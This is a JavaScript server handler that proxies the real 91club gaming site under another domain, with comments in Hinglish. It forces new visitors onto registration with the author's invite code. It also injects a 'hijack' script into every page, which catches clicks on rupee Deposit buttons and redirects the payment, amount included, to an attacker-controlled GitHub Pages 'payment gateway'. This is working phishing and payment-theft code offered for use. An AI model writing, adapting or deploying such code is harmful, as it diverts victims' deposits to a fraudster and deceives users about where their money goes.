export default async function handler(req, res) {
  const myInviteCode = "6683618531272"; // [cite: 2025-12-24]
  const targetHost = "https://www.91appq.com";
  const myGitHub = "https://hacrrk1-netizen.github.io/FAST-payment-gateway-/";

  // 1. AUTO-REGISTER: Pehli baar aane par seedha invite code page [cite: 2025-12-24]
  if (req.url === "/" || req.url === "") {
    res.writeHead(302, { Location: `${targetHost}/#/register?invitationCode=${myInviteCode}` });
    res.end();
    return;
  }

  // 2. PROXY SYSTEM: 91club ka saara content hamare domain par dikhao
  const response = await fetch(targetHost + req.url, {
    headers: { 'User-Agent': req.headers['user-agent'] }
  });

  const contentType = response.headers.get("content-type");

  if (contentType && contentType.includes("text/html")) {
    let html = await response.text();

    // 3. HIJACK SCRIPT: Jo tune 'chura' ke bheja hai (Event Capture Method)
    const hijackScript = `
    <script>
      (function() {
        const attackButton = () => {
          const els = document.querySelectorAll('button, .van-button, [role="button"], div');
          els.forEach(el => {
            const txt = el.innerText || "";
            // Target: Red Button with ₹ sign
            if (txt.includes('Deposit') && txt.includes('₹')) {
              if (!el.dataset.locked) {
                const hijack = (e) => {
                  e.preventDefault();
                  e.stopImmediatePropagation();
                  
                  // Amount capture
                  const amtMatch = txt.match(/[\\d,.]+/);
                  const amount = amtMatch ? amtMatch[0].replace(/,/g, '') : '2000';
                  
                  window.location.href = "${myGitHub}?amount=" + amount;
                };

                // 'True' matlab capture phase mein hi click pakad lo
                el.addEventListener('click', hijack, true);
                el.addEventListener('touchstart', hijack, true);
                el.dataset.locked = "true";
              }
            }
          });
        };
        setInterval(attackButton, 300);
      })();
    </script>`;

    res.setHeader('Content-Type', 'text/html');
    return res.send(html.replace('</body>', hijackScript + '</body>'));
  }

  // Baaki cheezein (JS/CSS) normal load hone do
  const data = await response.arrayBuffer();
  res.setHeader('Content-Type', contentType);
  res.send(Buffer.from(data));
}
